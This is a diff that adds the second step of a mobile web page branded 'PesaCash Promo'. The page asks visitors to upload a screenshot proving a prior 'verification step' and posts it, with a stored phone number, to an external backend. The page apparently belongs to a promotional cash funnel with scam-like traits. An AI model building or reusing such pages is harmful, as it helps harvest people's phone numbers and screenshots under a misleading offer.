@@ -83,4 +83,230 @@
 
     .upload-text {
       font-size: 14px;
-      color: #
+      color: #4b5563;
+      margin-bottom: 15px;
+    }
+
+    input[type="file"] {
+      width: 100%;
+      font-size: 14px;
+    }
+
+    .upload-btn {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 11px;
+      background: #16a34a;
+      color: white;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 15px;
+    }
+
+    .upload-btn:disabled {
+      background: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    .upload-btn:active {
+      transform: scale(0.98);
+    }
+
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    .note {
+      margin-top: 17px;
+      font-size: 12px;
+      color: #6b7280;
+      line-height: 1.5;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="card">
+
+    <div class="logo">
+      💰 PesaCash Promo
+    </div>
+
+    <div class="subtitle">
+      Complete the final step below.
+    </div>
+
+    <div class="step">
+      STEP 2 OF 2
+    </div>
+
+    <h1>📸 Upload Screenshot</h1>
+
+    <div class="instruction">
+      Upload a screenshot showing that you completed
+      the previous verification step.
+    </div>
+
+    <div class="upload-box">
+
+      <div class="upload-icon">
+        📷
+      </div>
+
+      <div class="upload-text">
+        Select your screenshot below.
+      </div>
+
+      <input
+        type="file"
+        id="screenshot"
+        accept="image/*"
+      >
+
+    </div>
+
+    <button
+      class="upload-btn"
+      id="uploadBtn"
+      onclick="uploadScreenshot()"
+    >
+      UPLOAD SCREENSHOT
+    </button>
+
+    <div
+      class="status"
+      id="status"
+    ></div>
+
+    <div class="note">
+      Make sure the screenshot is clear and readable.
+    </div>
+
+  </div>
+
+
+  <script>
+
+    async function uploadScreenshot() {
+
+      const fileInput =
+        document.getElementById("screenshot");
+
+      const uploadBtn =
+        document.getElementById("uploadBtn");
+
+      const status =
+        document.getElementById("status");
+
+      const file =
+        fileInput.files[0];
+
+
+      if (!file) {
+
+        status.textContent =
+          "Please select a screenshot first.";
+
+        return;
+      }
+
+
+      if (!file.type.startsWith("image/")) {
+
+        status.textContent =
+          "Please select an image file.";
+
+        return;
+      }
+
+
+      uploadBtn.disabled = true;
+
+      uploadBtn.textContent =
+        "UPLOADING...";
+
+      status.textContent =
+        "Please wait...";
+
+
+      const formData =
+        new FormData();
+
+      formData.append(
+        "screenshot",
+        file
+      );
+
+
+      const phone =
+        localStorage.getItem("skizaPhone");
+
+
+      if (phone) {
+
+        formData.append(
+          "phone",
+          phone
+        );
+
+      }
+
+
+      try {
+
+        const response =
+          await fetch(
+            "https://skiza-backend.onrender.com/upload",
+            {
+              method: "POST",
+              body: formData
+            }
+          );
+
+
+        const data =
+          await response.json();
+
+
+        if (!response.ok) {
+
+          throw new Error(
+            data.message ||
+            "Upload failed."
+          );
+
+        }
+
+
+        status.textContent =
+          "✅ Screenshot uploaded successfully!";
+
+        uploadBtn.textContent =
+          "UPLOADED";
+
+      } catch (error) {
+
+        console.error(error);
+
+        status.textContent =
+          "❌ Upload failed. Please try again.";
+
+        uploadBtn.disabled = false;
+
+        uploadBtn.textContent =
+          "UPLOAD SCREENSHOT";
+
+      }
+
+    }
+
+  </script>
+
+</body>
+</html>
